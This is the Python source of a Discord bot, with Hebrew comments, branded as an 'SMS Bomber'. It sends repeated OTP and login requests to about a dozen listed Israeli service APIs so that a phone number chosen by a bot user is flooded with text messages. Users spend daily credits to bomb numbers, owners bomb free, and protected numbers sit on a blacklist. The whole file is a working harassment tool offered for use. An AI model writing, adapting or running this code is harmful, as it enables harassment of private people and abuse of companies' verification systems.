import discord
from discord import app_commands
from discord.ext import commands
import os
import json
import httpx
import asyncio
from flask import Flask
from threading import Thread
import datetime

# --- מעקף Render (שומר על הבוט דלוק בחינם) ---
app = Flask('')
@app.route('/')
def home(): return "Bot is Online!"

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    Thread(target=run_flask).start()

# --- הגדרות בוט ומסד נתונים ---
TOKEN = os.getenv("DISCORD_TOKEN")
OWNER_ROLE_NAME = "Owner"
DB_FILE = "users_data.json"

def load_data():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r") as f: return json.load(f)
        except: return {"credits": {}, "blacklist": [], "last_daily": {}}
    return {"credits": {}, "blacklist": [], "last_daily": {}}

def save_data(data):
    with open(DB_FILE, "w") as f: json.dump(data, f, indent=4)

# --- מנוע ה-Spam (האתרים מהסרטון) ---
async def send_spam(phone_val):
    endpoints = [
        {"url": "https://api.wolt.com/v1/user/login/otp", "json": {"phone": f"+972{phone_val[1:]}"}},
        {"url": "https://www.10bis.co.il/NextApi/User/Login", "json": {"phoneNumber": phone_val, "isSmsAuth": True}},
        {"url": "https://pango.co.il/api/auth/login", "json": {"phone": phone_val}},
        {"url": "https://yellow.co.il/api/v1/auth/register-otp", "json": {"phone": phone_val}},
        {"url": "https://gett-israel.co.il/api/v1/auth/login", "json": {"phone": phone_val}},
        {"url": "https://pizzahut.co.il/api/v1/auth/otp", "json": {"phone": phone_val}},
        {"url": "https://www.dominos.co.il/api/v1/auth/otp", "json": {"phone": phone_val}},
        {"url": "https://rebar.co.il/api/v1/auth/login", "json": {"phone": phone_val}},
        {"url": "https://shoppers-api.super-pharm.co.il/api/v1/auth/otp", "json": {"phone": phone_val}},
        {"url": "https://ksp.co.il/api/v1/auth/send-otp", "json": {"phone": phone_val}},
        {"url": "https://www.ivory.co.il/api/v1/auth/login", "json": {"phone": phone_val}},
        {"url": "https://www.azrieli.com/api/v1/auth/otp", "json": {"phone": phone_val}}
    ]
    headers = {"User-Agent": "Mozilla/5.0"}
    async with httpx.AsyncClient(headers=headers, timeout=5.0) as client:
        for _ in range(2): # 2 סבבים של שליחה
            tasks = [client.post(api["url"], json=api.get("json")) for api in endpoints]
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(3)

# --- חלונות קופצים (Modals) ---
class SpamModal(discord.ui.Modal, title="Vouge Spam - SMS Bomber"):
    phone = discord.ui.TextInput(label="מספר טלפון", placeholder="05XXXXXXXX", min_length=10, max_length=10)

    async def on_submit(self, interaction: discord.Interaction):
        data = load_data()
        phone_val = self.phone.value
        user_id = str(interaction.user.id)
        is_owner = discord.utils.get(interaction.user.roles, name=OWNER_ROLE_NAME)

        if phone_val in data["blacklist"]:
            return await interaction.response.send_message(f"❌ המספר {phone_val} מוגן ברשימה השחורה!", ephemeral=True)
        
        if not is_owner:
            current_credits = data["credits"].get(user_id, 0)
            if current_credits <= 0:
                return await interaction.response.send_message("❌ אין לך מספיק קרדיטים! השתמש ב-/daily", ephemeral=True)
            data["credits"][user_id] -= 1
            save_data(data)

        await interaction.response.send_message(f"💣 הפצצה נשלחה למספר {phone_val}!", ephemeral=True)
        await send_spam(phone_val)

class SpamView(discord.ui.View):
    def __init__(self): super().__init__(timeout=None)
    @discord.ui.button(label="Spam Phone", style=discord.ButtonStyle.danger, emoji="🚀", custom_id="spam_btn")
    async def spam_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(SpamModal())

# --- מחלקת הבוט ---
class MyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.members = True
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        self.add_view(SpamView())
        await self.tree.sync()
        print(f"✅ Bot is ready as {self.user}")

bot = MyBot()

# --- פקודות משתמש ---
@bot.tree.command(name="credits", description="בדיקת יתרת הקרדיטים שלך")
async def credits_check(interaction: discord.Interaction):
    data = load_data()
    balance = data["credits"].get(str(interaction.user.id), 0)
    await interaction.response.send_message(f"💰 היתרה שלך: `{balance}` קרדיטים.", ephemeral=True)

@bot.tree.command(name="daily", description="קבלת קרדיט יומי בחינם")
async def daily_bonus(interaction: discord.Interaction):
    data = load_data()
    uid = str(interaction.user.id)
    today = str(datetime.date.today())
    if data.get("last_daily", {}).get(uid) == today:
        return await interaction.response.send_message("❌ כבר לקחת את הבונוס היומי שלך!", ephemeral=True)
    
    data["credits"][uid] = data["credits"].get(uid, 0) + 1
    if "last_daily" not in data: data["last_daily"] = {}
    data["last_daily"][uid] = today
    save_data(data)
    await interaction.response.send_message("🎁 קיבלת קרדיט 1 במתנה! חזור מחר.", ephemeral=True)

# --- פקודות אדמין (Owner Only) ---
@bot.tree.command(name="add_credits", description="[ADMIN] הוספת קרדיטים למשתמש")
async def admin_add(interaction: discord.Interaction, member: discord.Member, amount: int):
    if not discord.utils.get(interaction.user.roles, name=OWNER_ROLE_NAME):
        return await interaction.response.send_message("❌ הרשאת Owner בלבד!", ephemeral=True)
    data = load_data()
    uid = str(member.id)
    data["credits"][uid] = data["credits"].get(uid, 0) + amount
    save_data(data)
    await interaction.response.send_message(f"✅ נוספו {amount} קרדיטים ל-{member.mention}")

@bot.tree.command(name="blacklist_add", description="[ADMIN] חסימת מספר מהמערכת")
async def admin_bl(interaction: discord.Interaction, phone: str):
    if not discord.utils.get(interaction.user.roles, name=OWNER_ROLE_NAME):
        return await interaction.response.send_message("❌ הרשאת Owner בלבד!", ephemeral=True)
    data = load_data()
    if phone not in data["blacklist"]: data["blacklist"].append(phone)
    save_data(data)
    await interaction.response.send_message(f"🚫 המספר {phone} נוסף לרשימה השחורה.")

@bot.tree.command(name="setup", description="[ADMIN] פתיחת פאנל ההפצצה")
async def admin_setup(interaction: discord.Interaction):
    if not discord.utils.get(interaction.user.roles, name=OWNER_ROLE_NAME):
        return await interaction.response.send_message("❌ הרשאת Owner בלבד!", ephemeral=True)
    embed = discord.Embed(title="🤖 Vouge Spam Me - Premium", description="לחץ על הכפתור למטה.\nאדמינים מפציצים בחינם!", color=discord.Color.dark_red())
    await interaction.response.send_message(embed=embed, view=SpamView())

@bot.tree.command(name="restart", description="[ADMIN] אתחול הבוט")
async def admin_restart(interaction: discord.Interaction):
    if not discord.utils.get(interaction.user.roles, name=OWNER_ROLE_NAME):
        return await interaction.response.send_message("❌ הרשאת Owner בלבד!", ephemeral=True)
    await interaction.response.send_message("🔄 מאתחל את המערכת...")
    os._exit(1)

if __name__ == "__main__":
    keep_alive()
    bot.run(TOKEN)
